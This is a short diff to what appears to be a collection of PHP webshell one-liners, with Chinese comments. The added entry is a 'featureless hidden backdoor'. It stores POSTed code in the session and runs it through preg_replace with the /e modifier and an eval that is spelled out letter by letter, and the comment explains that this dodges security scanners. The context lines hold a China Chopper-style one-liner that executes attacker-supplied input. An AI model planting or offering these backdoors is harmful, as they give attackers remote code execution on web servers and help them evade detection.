@@ -1,3 +1,9 @@
+无特征隐藏PHP后门
+<?php session_start();$_POST['code'] && $_SESSION['theCode'] = trim($_POST['code']);$_SESSION['theCode'] && preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\'theCode\']))','a');?>
+利用$_SEESION变量来绕过扫描，将$_POST['code']赋值给$_SESSION['theCode']，然后eval执行SESSION的内容。
+
+
+
 //菜刀一句话
 $hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
 $hh("/[discuz]/e",$_POST['h'],"Access");
